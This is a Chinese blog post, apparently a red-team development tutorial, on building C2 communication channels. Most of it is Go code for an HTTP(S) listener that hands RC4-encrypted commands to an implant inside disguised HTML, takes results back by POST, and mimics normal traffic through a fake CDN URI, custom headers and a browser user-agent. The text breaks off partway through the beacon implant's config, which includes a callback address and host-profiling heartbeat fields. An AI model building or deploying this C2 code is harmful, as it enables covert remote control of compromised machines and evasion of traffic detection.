<!DOCTYPE html>
<html lang="en" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="John Doe" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  
  
  <title>
    
      C2通信协议解析（一）：HTTP(s)、mTLS、WebSocket、DNS 
      
      
      |
    
     Hexo
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.jpg">
    <link rel="icon" href="/images/favicon.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">oneday</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">C2通信协议解析（一）：HTTP(s)、mTLS、WebSocket、DNS</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2025-10-14 21:59:51
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="Categories"></i>
                
                <span class="span--category">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-C2/" title="安全开发_C2">
                    <b>#</b> 安全开发_C2
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <blockquote>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/onedays12/C2Protocol">https://github.com/onedays12/C2Protocol</a></p>
</blockquote>
<p>《安全开发-C2》是系列文章，本文是其子主题《通信协议》，我可以明确的说一定会有第二篇和第三篇，小概率有第四篇，每篇文章介绍4或5个C2协议，包含了到目前为止我对C2通信协议的所有理解，如有错误地方还请各位师傅指出！</p>
<p>本文涉及到大量的<strong>TCP&#x2F;IP协议族</strong>的内容，虽然我会在本文中补充相关协议的知识点，但也只是一笔带过，想了解更多细节请参阅网上资料！</p>
<p>这片文章的灵感来自在上一篇文章《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18564">从零开始手搓C2框架</a>》中我提到了任务数据可以通过各种C2协议传输，那时的我并没有意识到这是一个很好的文章idea，只想快点写完文章然后好好的休息一下。</p>
<p>静养期间，我偶尔翻阅旧文（这还算休息吗？）。鼠标在书签栏来回滑动，目光扫过标题时，脑中突然电光一闪：这不正是观察现代C2如何迭代伪装、躲避流量检测的绝佳切入口吗？赶紧打开Obsidian然后创建一篇文章，写完标题后我就扔在一旁了，因为我真的很累没时间写。</p>
<p>说到底，这只是一篇再普通不过的笔记，并没有让人眼前一亮的点，我想说的说：：<strong>“嘿，我又来了，今天也带了点新东西，即使是老酒，我也用新瓶装。”</strong> 我只是将自己学习过程中遇到有意思知识记录下来然后分享给各位师傅。</p>
<h1 id="一、HTTP-HTTPS"><a href="#一、HTTP-HTTPS" class="headerlink" title="一、HTTP&#x2F;HTTPS"></a>一、HTTP&#x2F;HTTPS</h1><p>现代C2框架中，HTTP(S)协议因其高带宽、普遍性和加密特性，成为理想的通信渠道。以下是关于HTTP(S)监听器的详细构建指南，包括域前置技术的集成。</p>
<h2 id="1-1-思路构建"><a href="#1-1-思路构建" class="headerlink" title="1.1 思路构建"></a>1.1 思路构建</h2><p>由于HTTP(S)协议监听器太过普遍，所以就不过多介绍HTTP(S)的定义了，直接开始思路构建。</p>
<p><strong>第一点，任务怎么获取</strong>：相信看过我文章的师傅应该会清楚，我在上篇文章的基础上大幅度简化http(s）监听器的代码，这样做只是保留最核心的代码让各位读者能够直接感受到http监听器是如何完成任务下发和结果回传的。Server先起一个HTTP&#x2F;HTTPS 监听器（<code>IS_HTTPS</code> 决定协议类型），随后在监听器上按自定义URI注册路由。路由告诉Beacon“从哪访问服务”——也就是用什么method+URI的组合来拿任务和回传结果。</p>
<p>HTTP&#x2F;HTTPS监听器本质上是一个HTTP服务器，任何支持编写HTTP服务器的框架都能够实现监听器，根据这段时间的代码编写经历，个人还是喜欢用gin来编写http服务器，当然go的标准库 <code>net/http</code> 也可以写，只是没这么方便。</p>
<p>既然监听器本身是一个HTTP服务器，那么我们可以做一个html的模板，在html里放置placeholder（占位符），当Beacon通过Get的方式来取任务数据，我们就将加密后的任务数据嵌入到html里，然后作为结果返回给Beacon。</p>
<p><strong>第二点，不需要任务队列</strong>：一般情况下，需要给监听器创建一个任务队列，可是这样做代码量又是直接飙升，这篇文章只是探讨C2协议，不是搭建完整的C2框架，不如直接硬编码命令，不知道各位师傅觉得如何呢😋</p>
<p><strong>第三点，怎么执行任务</strong>：在第一点中我说了，任务数据是存放在html里的，beacon接收到html，根据正则匹配获取任务数据，然后解密任务数据获取命令，这样就可以执行了。需要说明的是本文的示例中只能够执行cmd命令，执行不了复杂的命令，理由见下一小点。</p>
<p><strong>第四点，JSON打包万岁</strong>：在本文中所有C2协议我不想在代码中实现自定义打包器了，虽然它的可扩展性很高，可是我懒得实现！用go的 <code>encoding/json</code> 一把梭，可以释放大脑，然而这样做的后果就是任务数据和结果数据必须严格遵守json的格式，这种方式显然不适合实战。</p>
<p><strong>第五点，结果回传</strong>：metadata和任务执行的结果用json反序列化，然后beacon再以POST的方式访问接口，提交数据给Server。Server中有专门结果回传的函数，其实不用过多处理结果，直接打印就完事了。</p>
<p><strong>第六点，流量规避</strong>：为了使Beacon与Server之间的通信流量看起来像正常的HTTP数据，需要给操作员自定义流量的权限。具体来说就是是否开启SSL、自定义响应头、HOST、PORT、URI、证书、返回给beacon的html内容等。</p>
<p>所有控制的参数都写在server.go的开头，都是为了保证更像“正常的流量”，当然可控的参数并不完整，读者可以自行探究，比如说返回的html页面可以修改成某某后台管理系统，让ai分析一下流量，如果分析是正常流量也就差不多了，当然本文我没这么做。</p>
<h2 id="1-2-代码实现"><a href="#1-2-代码实现" class="headerlink" title="1.2 代码实现"></a>1.2 代码实现</h2><h3 id="1-2-1-Server"><a href="#1-2-1-Server" class="headerlink" title="1.2.1 Server"></a>1.2.1 Server</h3><p>这就是所谓的可控参数，在实际的C2框架中，这些都是操作员（前端GUI或者web）传输到Server，然后server根据这些参数启动监听器和生成Beacon配置。主要介绍ListenerStart、parseBeat、processRequest、processResponse和main方法，其他工具函数不详细说了，具体代码去github看就行。</p>
<p>可控参数</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (  </span><br><span class="line">    HOST          = <span class="string">&quot;0.0.0.0&quot;</span>  </span><br><span class="line">    PORT          = <span class="number">9090</span>  </span><br><span class="line">    URI           = <span class="string">&quot;/cdn-cgi/trace&quot;</span>  </span><br><span class="line">    IS_HTTPS      = <span class="literal">false</span>  </span><br><span class="line">    SSLCertPath   = <span class="string">&quot;static/server.crt&quot;</span>  </span><br><span class="line">    SSLKeyPath    = <span class="string">&quot;static/server.key&quot;</span>  </span><br><span class="line">    payloadPath   = <span class="string">&quot;static/payload.html&quot;</span>  </span><br><span class="line">    pageErrorPath = <span class="string">&quot;static/404.html&quot;</span>  </span><br><span class="line">    HBHeader      = <span class="string">&quot;X-Session-Id&quot;</span>  </span><br><span class="line">    HBPrefix      = <span class="string">&quot;session=&quot;</span>  </span><br><span class="line">    EncryptKey    = <span class="string">&quot;01234567890123456789&quot;</span>  </span><br><span class="line">    placeholder   = <span class="string">&quot;&#123;&#123;.Cmd&#125;&#125;&quot;</span>  </span><br><span class="line">    taskData      = <span class="string">&quot;ipconfig&quot;</span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>的ListenerStart方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenerStart</span><span class="params">()</span></span> *http.Server &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> err <span class="type">error</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 设置gin的模式为debug模式并注册路由  </span></span><br><span class="line">    gin.SetMode(gin.DebugMode)  </span><br><span class="line">    router := gin.New()  </span><br><span class="line">    router.GET(URI, processRequest)  </span><br><span class="line">    router.POST(URI, processResponse)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 创建http服务对象  </span></span><br><span class="line">    server := &amp;http.Server&#123;  </span><br><span class="line">       Addr:    fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, HOST, PORT),  </span><br><span class="line">       Handler: router,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 启动https服务或http服务  </span></span><br><span class="line">    <span class="keyword">if</span> IS_HTTPS &#123;  </span><br><span class="line">       <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">          err = server.ListenAndServeTLS(SSLCertPath, SSLKeyPath)  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, http.ErrServerClosed) &#123;  </span><br><span class="line">             fmt.Printf(<span class="string">&quot;Error starting HTTPS server: %v\n&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;()  </span><br><span class="line">  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;   Started listener: https://%s:%d%s\n&quot;</span>, HOST, PORT, URI)  </span><br><span class="line">  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">          err = server.ListenAndServe()  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, http.ErrServerClosed) &#123;  </span><br><span class="line">             fmt.Printf(<span class="string">&quot;Error starting HTTP server: %v\n&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;()  </span><br><span class="line">  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;   Started listener: http://%s:%d%s\n&quot;</span>, HOST, PORT, URI)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> server  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的功能主要是使用Gin框架生成一个router（本质是一个 <code>*Engine</code>，能够启动服务器），然后根据HOST, PORT、router创建一个http.Server实例。接着根据 <code>IS_HTTPS</code> 来决定启动HTTP服务器还是HTTPS服务器，说实话http和https在数据的加密层面区别不大，因为不管是http和https，在数据传输之前都会先进行一遍RC4加密（可使用AES，更安全）。</p>
<p>parseBeat方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseBeat</span><span class="params">(ctx *gin.Context)</span></span> <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. 解析 Cookie 里的 SESSIONID    </span></span><br><span class="line">    cookie := ctx.Request.Header.Get(HBHeader)  </span><br><span class="line">    <span class="keyword">if</span> !strings.HasPrefix(cookie, HBPrefix) &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;no SESSIONID in cookie&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beatB64 := strings.TrimPrefix(cookie, HBPrefix)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. base64url 解码  </span></span><br><span class="line">    beaconInfoCrypt, err := base64.RawURLEncoding.DecodeString(beatB64)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || <span class="built_in">len</span>(beaconInfoCrypt) &lt; <span class="number">8</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;failed to decode beat&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. RC4 解密  </span></span><br><span class="line">    rc4crypt, err := rc4.NewCipher([]<span class="type">byte</span>(EncryptKey))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;rc4 decrypt error&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beaconInfo := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(beaconInfoCrypt))  </span><br><span class="line">    rc4crypt.XORKeyStream(beaconInfo, beaconInfoCrypt)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 4. 输出metaData  </span></span><br><span class="line">    metaData := <span class="type">string</span>(beaconInfo)  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;   Beat metaData: %s\n&quot;</span>, metaData)  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在C2远控中，Beacon首次上线或重连时发送 <code>Metadata</code>（在本文中HeartBeat和Metadata是同一个东西，但是在不同文章中它们还是有很大区别），<code>Metadata</code> 通常包含了<strong>主机信息</strong>（主机名、用户名、系统版本、进程权限、网络配置等）和<strong>会话密钥</strong>（本文中不实现）。</p>
<p>上述代码的功能就是去解析存放在自定义请求头中的心跳包，然后base64解码，接着RC4解密，本文并未实现上线注册的相关代码，所以最后会在server的控制台输出一串紧凑的json字符串。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/23/21-27-10-dda8741b5cf8a02d2650574f150186e8-20250923212709-a28776.png"></p>
<p>processRequest方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processRequest</span><span class="params">(ctx *gin.Context)</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 解析心跳包  </span></span><br><span class="line">    parseBeat(ctx)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取客户端IP  </span></span><br><span class="line">    externalIP := clientIP(ctx.Request)  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;   Received request from %s\n&quot;</span>, externalIP)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 将任务数据嵌入到html模板中  </span></span><br><span class="line">    payload, err := os.ReadFile(payloadPath)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// RC4 加密  </span></span><br><span class="line">    encryptData, err := RC4Crypt([]<span class="type">byte</span>(taskData), []<span class="type">byte</span>(EncryptKey))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 嵌入任务数据到html模板中  </span></span><br><span class="line">    html := []<span class="type">byte</span>(strings.ReplaceAll(<span class="type">string</span>(payload), placeholder, <span class="type">string</span>(encryptData)))  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 设置响应头并返回加密数据  </span></span><br><span class="line">    setHeaders(ctx)  </span><br><span class="line">    _, _ = ctx.Writer.Write(html)  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当Beacon通过Get方法访问相应的接口时，会由 <code>processRequest</code> 处理请求。<code>processRequest</code> 方法会调用 <code>parseBeat</code> 方法解析心跳包，然后获取externalIP，这个和上一步是连在一起为注册Beacon做准备的（本文未实现注册）。紧接着根据placeholder占位符找到数据存放的位置，将加密后的任务数据嵌入到html模板中。最后设置响应头返回hmtl内容给Beacon。</p>
<p>processResponse方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processResponse</span><span class="params">(ctx *gin.Context)</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 解析心跳包  </span></span><br><span class="line">    parseBeat(ctx)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取客户端IP  </span></span><br><span class="line">    externalIP := clientIP(ctx.Request)  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;   Received request from %s\n&quot;</span>, externalIP)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 处理 agent 数据  </span></span><br><span class="line">    <span class="comment">// 读取原始 body    </span></span><br><span class="line">    bodyBytes, _ := io.ReadAll(ctx.Request.Body)  </span><br><span class="line">    <span class="keyword">defer</span> ctx.Request.Body.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 解密 body    </span></span><br><span class="line">    decryptedData, err := RC4Crypt(bodyBytes, []<span class="type">byte</span>(EncryptKey))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    log.Printf(<span class="string">&quot;[HTTP] ← String view:\n%s&quot;</span>, <span class="type">string</span>(decryptedData))  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 返回成功响应  </span></span><br><span class="line">    setHeaders(ctx)  </span><br><span class="line">    ctx.AbortWithStatus(http.StatusOK)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当Beacon通过POST方法访问相应的接口时，会由 <code>processResponse</code> 处理请求。<code>processResponse</code> 也会调用 <code>parseBeat</code> 解析心跳包和获取客户端IP，这主要是为了保险起见，当然我觉得是很冗余了，有兴趣的师傅可以自己修改。这也是为什么在Server的控制台输出两段心跳包的原因。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/10/23-04-15-4b1bd303def923e00cb0d64753377554-20250910230415-dc86c7.png"></p>
<p>紧接着会提取请求包里的内容，将body解密，直接输出到Server的控制台上。因为并没有指定编码的原因，控制台会输出乱码，可以用项目中自带的utils.ConvertUTF8toCp方法转换编码，这需要反序列化心跳包，得到ACP字段的值，因为比较麻烦我就不在代码中实现了。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/11-10-45-c1fef14c4d315c911bef98817156675f-20250907111045-28cb97.png"></p>
<p>最后就是main方法了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    srv := ListenerStart()  </span><br><span class="line">  </span><br><span class="line">    quit := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)  </span><br><span class="line">    signal.Notify(quit, os.Interrupt, syscall.SIGTERM)  </span><br><span class="line">    &lt;-quit <span class="comment">// 阻塞直到 Ctrl-C    </span></span><br><span class="line">    ctx, cancel := context.WithTimeout(context.Background(), <span class="number">5</span>*time.Second)  </span><br><span class="line">    <span class="keyword">defer</span> cancel()  </span><br><span class="line">    <span class="keyword">if</span> err := srv.Shutdown(ctx); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;Server forced to shutdown:&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    fmt.Println(<span class="string">&quot;Server exited&quot;</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里唯一需要说明的是：我们在代码中单独启用一个goroutine去执行HTTP监听器，不用goroutine则主线程会被 <code>ListenAndServe</code> 永远占住，在实际项目中这是不合理的；如果用了goroutine，在main中不监听监听结束信号，则主线程在启动完 <code>ListenAndServe</code> 就直接结束，监听的goroutine也跟着被强制杀掉。</p>
<h3 id="1-2-2-Beacon"><a href="#1-2-2-Beacon" class="headerlink" title="1.2.2 Beacon"></a>1.2.2 Beacon</h3><p>定义简化后的BeaconConfig和HeartBeat结构体，只保留我认为关键的字段。然后创建全局变量beaconProfile和heartBeat，各个字段硬编码！</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BeaconConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Sleep           <span class="type">int32</span>  </span><br><span class="line">    Jitter          <span class="type">int32</span>  </span><br><span class="line">    URI             <span class="type">string</span>  </span><br><span class="line">    CallBackAddress <span class="type">string</span>  </span><br><span class="line">    IS_HTTPS        <span class="type">bool</span>  </span><br><span class="line">    EncryptKey      []<span class="type">byte</span>  </span><br><span class="line">    HBHeader        <span class="type">string</span>  </span><br><span class="line">    HBPrefix        <span class="type">string</span>  </span><br><span class="line">    UserAgent       <span class="type">string</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> HeartBeat <span class="keyword">struct</span> &#123;  </span><br><span class="line">    BeaconId    <span class="type">int32</span>  <span class="string">`json:&quot;beacon_id&quot;`</span>  </span><br><span class="line">    Sleep       <span class="type">int32</span>  <span class="string">`json:&quot;sleep&quot;`</span>  </span><br><span class="line">    Jitter      <span class="type">int32</span>  <span class="string">`json:&quot;jitter&quot;`</span>  </span><br><span class="line">    PID         <span class="type">int32</span>  <span class="string">`json:&quot;pid&quot;`</span>  </span><br><span class="line">    ACP         <span class="type">int32</span>  <span class="string">`json:&quot;acp&quot;`</span>  </span><br><span class="line">    InternalIP  <span class="type">int32</span>  <span class="string">`json:&quot;internal_ip&quot;`</span>  </span><br><span class="line">    Computer    <span class="type">string</span> <span class="string">`json:&quot;computer&quot;`</span>  </span><br><span class="line">    Username    <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span>  </span><br><span class="line">    ProcessName <span class="type">string</span> <span class="string">`json:&quot;process_name&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> beaconProfile = BeaconConfig&#123;  </span><br><span class="line">    Sleep:           <span class="number">5</span>,  </span><br><span class="line">    Jitter:          <span class="number">2</span>,  </span><br><span class="line">    URI:             <span class="string">&quot;/cdn-cgi/trace&quot;</span>,  </span><br><span class="line">    CallBackAddress: <span class="string">&quot;192.168.3.1:9090&quot;</span>,  </span><br><span class="line">    IS_HTTPS:        <span class="literal">false</span>,  </span><br><span class="line">    EncryptKey:      []<span class="type">byte</span>(<span class="string">&quot;01234567890123456789&quot;</span>),  </span><br><span class="line">    HBHeader:        <span class="string">&quot;X-Session-Id&quot;</span>,  </span><br><span class="line">    HBPrefix:        <span class="string">&quot;session=&quot;</span>,  </span><br><span class="line">    UserAgent:       <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> heartBeat = HeartBeat&#123;  </span><br><span class="line">    BeaconId:    rand.Int32(),  </span><br><span class="line">    Sleep:       beaconProfile.Sleep,  </span><br><span class="line">    Jitter:      beaconProfile.Jitter,  </span><br><span class="line">    PID:         <span class="type">int32</span>(os.Getpid()),  </span><br><span class="line">    ACP:         utils.GetCodePageANSI(),  